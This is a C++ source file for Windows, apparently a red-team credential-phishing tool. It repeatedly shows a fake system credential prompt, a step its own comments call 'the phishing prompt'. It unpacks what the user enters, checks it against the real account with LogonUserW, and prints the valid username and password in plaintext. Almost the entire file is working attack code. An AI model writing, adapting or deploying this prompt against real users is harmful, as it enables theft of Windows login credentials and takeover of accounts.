#include <Windows.h>
#include <wincred.h>
#include <iostream>

#pragma comment(lib, "Credui.lib")

using namespace std;

void main()
{
	BOOL user_login_status = FALSE;

	while (TRUE)
	{
		// Initializing the credui structure. This structure contain the information that is needed to show to the user
		CREDUI_INFOW usercred = {};
		usercred.cbSize = sizeof(usercred);
		usercred.hwndParent = nullptr;
		usercred.pszCaptionText = L"Please enter your credentials to process the request.";
		usercred.hbmBanner = nullptr;

		LPVOID outBuffer = nullptr;
		ULONG authentication_package = 0;
		DWORD err = 0;
		BOOL save = false;
		ULONG outCredSize = 0;

		//CredUIPromptForWindowsCredentialsW API will be used to display the phishing prompt to the user
		err = CredUIPromptForWindowsCredentialsW(&usercred, err, &authentication_package, nullptr, 0, &outBuffer, &outCredSize, &save, CREDUIWIN_ENUMERATE_CURRENT_USER);
		if (err == ERROR_SUCCESS) {
			WCHAR pszUName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			WCHAR pszPwd[CREDUI_MAX_PASSWORD_LENGTH * sizeof(WCHAR)];
			WCHAR domain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			DWORD maxLenName = CREDUI_MAX_USERNAME_LENGTH + 1;
			DWORD maxLenPassword = CREDUI_MAX_PASSWORD_LENGTH + 1;
			DWORD maxLenDomain = CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1;

			//CredUnPackAuthenticationBufferW API will be used to convert the buffer data to a human-readable data
			CredUnPackAuthenticationBufferW(CRED_PACK_PROTECTED_CREDENTIALS, outBuffer, outCredSize, pszUName, &maxLenName, domain, &maxLenDomain, pszPwd, &maxLenPassword);

			WCHAR parsedUserName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			WCHAR parsedDomain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];

			//CredUIParseUserNameW API will be used to pars the username and password
			CredUIParseUserNameW(pszUName, parsedUserName, CREDUI_MAX_USERNAME_LENGTH + 1, parsedDomain, CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1);

			// LogonUserW API will be used to check whether the user has entered the valid credentials
			HANDLE handle = nullptr;
			user_login_status = LogonUserW(parsedUserName, parsedDomain, pszPwd, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &handle);


			if (user_login_status == FALSE)
			{
				wcout << "\n[ERROR] Invalid credential is entered";
				user_login_status = FALSE;
			}

			else
			{
				wcout << "\n[*] Valid credential is entered as follow ";
				wcout << "\n	[+] Username is : " << pszUName;
				wcout << "\n	[+] password is :" << pszPwd;
				break;
			}

		}
	}
}